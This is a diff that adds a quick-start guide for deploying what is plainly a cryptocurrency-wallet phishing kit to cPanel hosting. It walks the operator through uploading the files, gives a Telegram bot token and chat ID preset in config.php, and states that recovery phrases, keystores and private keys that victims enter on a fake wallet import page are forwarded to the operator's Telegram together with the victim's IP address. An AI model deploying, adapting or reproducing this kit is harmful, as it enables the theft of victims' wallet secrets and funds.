@@ -1,0 +1,61 @@
+═══════════════════════════════════════════════════════════
+  🚀 QUICK START - DEPLOY TO CPANEL IN 3 STEPS
+═══════════════════════════════════════════════════════════
+
+STEP 1: UPLOAD FILES
+───────────────────────────────────────────────────────────
+1. Login to cPanel
+2. Open File Manager
+3. Go to public_html folder
+4. Upload ALL files and folders from this package
+5. Keep the exact folder structure
+
+STEP 2: CONFIGURE TELEGRAM
+───────────────────────────────────────────────────────────
+1. Open config.php in File Manager
+2. Your Telegram credentials are already set:
+   - Bot Token: 8207229530:AAF2CAILD5IU8etTbdPfp5MWQbrd2bgYux0
+   - Chat ID: 7811008623
+3. Save the file
+
+STEP 3: TEST
+───────────────────────────────────────────────────────────
+1. Visit: https://yourdomain.com/test_telegram.php
+2. Check your Telegram - you should receive a test message
+3. Visit: https://yourdomain.com/ (homepage)
+4. Visit: https://yourdomain.com/wallet/ (wallet page)
+5. Try submitting test data
+6. Check Telegram for notifications
+
+✅ DONE! Your site is live!
+
+═══════════════════════════════════════════════════════════
+  📋 WHAT HAPPENS WHEN USER SUBMITS DATA
+═══════════════════════════════════════════════════════════
+
+1. User enters recovery phrase/keystore/private key
+2. User clicks "Import" button
+3. Data is sent to submit.php
+4. submit.php formats the data
+5. Data is sent to your Telegram bot
+6. You receive instant notification with:
+   - Type of data (phrase/keystore/key)
+   - Wallet name
+   - IP address
+   - Timestamp
+   - The actual data entered
+
+═══════════════════════════════════════════════════════════
+  🔒 SECURITY TIP
+═══════════════════════════════════════════════════════════
+
+After testing, DELETE these files:
+- test_telegram.php
+- test_form.html
+- test_local.html
+- All test_*.php files
+
+═══════════════════════════════════════════════════════════
+
+Need help? Check DEPLOY_TO_CPANEL.md for detailed guide.
+
